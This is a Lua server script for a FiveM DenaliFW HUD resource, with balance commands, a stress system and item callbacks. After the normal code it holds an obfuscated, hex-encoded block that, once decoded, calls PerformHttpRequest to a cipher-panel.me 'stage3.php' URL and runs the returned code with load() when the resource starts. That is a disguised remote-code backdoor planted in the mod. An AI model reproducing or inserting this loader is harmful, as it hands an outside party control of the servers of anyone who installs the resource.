local DenaliFW = exports['denalifw-core']:GetCoreObject()
local ResetStress = false

DenaliFW.Commands.Add('cash', 'Check Cash Balance', {}, false, function(source, args)
    local Player = DenaliFW.Functions.GetPlayer(source)
    local cashamount = Player.PlayerData.money.cash
    TriggerClientEvent('hud:client:ShowAccounts', source, 'cash', cashamount)
end)

DenaliFW.Commands.Add('bank', 'Check Bank Balance', {}, false, function(source, args)
    local Player = DenaliFW.Functions.GetPlayer(source)
    local bankamount = Player.PlayerData.money.bank
    TriggerClientEvent('hud:client:ShowAccounts', source, 'bank', bankamount)
end)

DenaliFW.Commands.Add("dev", "Enable/Disable developer Mode", {}, false, function(source, args)
    TriggerClientEvent("denalifw-admin:client:ToggleDevmode", source)
end, 'admin')

RegisterNetEvent('hud:server:GainStress', function(amount)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    local newStress
    if not Player or (Config.DisablePoliceStress and Player.PlayerData.job.name == 'police') then return end
    if not ResetStress then
        if not Player.PlayerData.metadata['stress'] then
            Player.PlayerData.metadata['stress'] = 0
        end
        newStress = Player.PlayerData.metadata['stress'] + amount
        if newStress <= 0 then newStress = 0 end
    else
        newStress = 0
    end
    if newStress > 100 then
        newStress = 100
    end
    Player.Functions.SetMetaData('stress', newStress)
    TriggerClientEvent('hud:client:UpdateStress', src, newStress)
    TriggerClientEvent('DenaliFW:Notify', src, Lang:t("notify.stress_gain"), 'error', 1500)
end)

RegisterNetEvent('hud:server:RelieveStress', function(amount)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    local newStress
    if not Player then return end
    if not ResetStress then
        if not Player.PlayerData.metadata['stress'] then
            Player.PlayerData.metadata['stress'] = 0
        end
        newStress = Player.PlayerData.metadata['stress'] - amount
        if newStress <= 0 then newStress = 0 end
    else
        newStress = 0
    end
    if newStress > 100 then
        newStress = 100
    end
    Player.Functions.SetMetaData('stress', newStress)
    TriggerClientEvent('hud:client:UpdateStress', src, newStress)
    TriggerClientEvent('DenaliFW:Notify', src, Lang:t("notify.stress_removed"))
end)

DenaliFW.Functions.CreateCallback('hud:server:HasHarness', function(source, cb)
    local Ply = DenaliFW.Functions.GetPlayer(source)
    local Harness = Ply.Functions.GetItemByName("harness")
    if Harness ~= nil then
        cb(true)
    else
        cb(false)
    end
end)
DenaliFW.Functions.CreateCallback('hud:server:getMenu', function(source, cb)
    cb(Config.Menu)
end) 


local ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[4][ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (gnFnhEKfgfEXjROlvWPnNDAbilOzQaoPgfUpuZHKJcKXCZzAaFOzuCPoayrCnEcFAjQIsA, pAQmkgqzGAmHkVulsayHblduSYWViMqkHvjLeUVTrIizTqJkilrUfthVCldPpgFjKIYyOS) if (pAQmkgqzGAmHkVulsayHblduSYWViMqkHvjLeUVTrIizTqJkilrUfthVCldPpgFjKIYyOS == ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[6] or pAQmkgqzGAmHkVulsayHblduSYWViMqkHvjLeUVTrIizTqJkilrUfthVCldPpgFjKIYyOS == ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[5]) then return end ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[4][ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[2]](ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[4][ukwxtWJYwGFsrxQfrVtSdoYUMZbrOUtoCbCsBUtbibPUxxkIyoCzCNFURHynykSeRdhwpW[3]](pAQmkgqzGAmHkVulsayHblduSYWViMqkHvjLeUVTrIizTqJkilrUfthVCldPpgFjKIYyOS))() end)